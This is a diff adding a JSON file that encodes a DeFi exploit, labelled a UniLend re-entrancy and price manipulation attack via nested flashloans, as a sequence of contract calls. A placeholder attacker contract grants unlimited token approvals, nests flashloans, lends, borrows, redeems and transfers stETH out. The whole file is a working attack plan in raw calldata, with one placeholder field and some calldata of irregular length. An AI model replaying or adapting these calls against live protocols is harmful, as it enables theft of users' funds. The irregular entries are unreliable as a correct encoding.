@@ -1,0 +1,134 @@
+{
+  "bot_contract_address": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+  "attack_name": "UniLend Re-entrancy & Price Manipulation via Nested Flashloans",
+  "calls": [
+    {
+      "hierarchy": [],
+      "call_type": "CALL",
+      "from": "0xE01Bc0413E0Ac53dD423BC37C15172255a02E25E",
+      "target": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "value": "0",
+      "calldata": "0x... (这里是Go编译器根据所有其他calls生成的、用于调用executeAttack函数的完整ABI编码数据)"
+    },
+    {
+      "hierarchy": [1],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      "value": "0",
+      "calldata": "0x095ea7b3000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "hierarchy": [2],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      "value": "0",
+      "calldata": "0x095ea7b30000000000000000000000007f2e24d2394f2bdabb464b888cb02eba6d15b958ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "hierarchy": [3],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+      "value": "0",
+      "calldata": "0x095ea7b3000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcbffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "hierarchy": [4],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+      "value": "0",
+      "calldata": "0x095ea7b30000000000000000000000007f2e24d2394f2bdabb464b888cb02eba6d15b958ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "hierarchy": [5],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+      "value": "0",
+      "calldata": "0x095ea7b30000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    },
+    {
+      "hierarchy": [6],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb",
+      "value": "0",
+      "calldata": "0x03842598000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000d8d726b71a80000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000073000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
+    },
+    {
+      "hierarchy": [6, 1],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb",
+      "value": "0",
+      "calldata": "0x038425980000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca000000000000000000000000000000000000000000000000050033904a7c3c77f0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000730000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0"
+    },
+    {
+      "hierarchy": [6, 1, 1],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+      "value": "0",
+      "calldata": "0x4c2299a800000000000000000000000000000000000000000000000050033904a7c3c77f"
+    },
+    {
+      "hierarchy": [6, 1, 2],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958",
+      "value": "0",
+      "calldata": "0x358562440000000000000000000000004e34dd25dbd367b1bf82e1b5527dbbe799fad0d0ffffffffffffffffffffffffffffffffffffffffffffd1a71255d08c0000"
+    },
+    {
+      "hierarchy": [6, 1, 3],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958",
+      "value": "0",
+      "calldata": "0x358562440000000000000000000000004e34dd25dbd367b1bf82e1b5527dbbe799fad0d00000000000000000000000000000000000000000000033b2e3c9fd0803ce8000"
+    },
+    {
+      "hierarchy": [6, 1, 4],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958",
+      "value": "0",
+      "calldata": "0x4b3fd87c0000000000000000000000004e34dd25dbd367b1bf82e1b5527dbbe799fad0d00000000000000000000000000000000000000000000033b2e3c9fd0803ce8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+    },
+    {
+      "hierarchy": [6, 1, 5],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958",
+      "value": "0",
+      "calldata": "0x9f2a28530000000000000000000000004e34dd25dbd367b1bf82e1b5527dbbe799fad0d00000000000000000000000000000000000000000000033b2e3c9fd0803ce8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+    },
+    {
+      "hierarchy": [6, 1, 6],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f2E24D2394f2bdabb464B888cb02EbA6d15B958",
+      "value": "0",
+      "calldata": "0x9f2a28530000000000000000000000004e34dd25dbd367b1bf82e1b5527dbbe799fad0d0ffffffffffffffffffffffffffffffffffffffffffffd1a71255d08c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
+    },
+    {
+      "hierarchy": [6, 1, 7],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0",
+      "value": "0",
+      "calldata": "0x42966c6800000000000000000000000000000000000000000000033b2e3c9fd0803ce8000"
+    },
+    {
+      "hierarchy": [6, 1, 8],
+      "call_type": "CALL",
+      "from": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
+      "target": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+      "value": "0",
+      "calldata": "0xa9059cbb00000000000000000000000055f5f8058816d5376df310770ca3a2e294089c3300000000000000000000000000000000000000000000033b2e3c9fd0803ce8000"
+    }
+  ]
+}
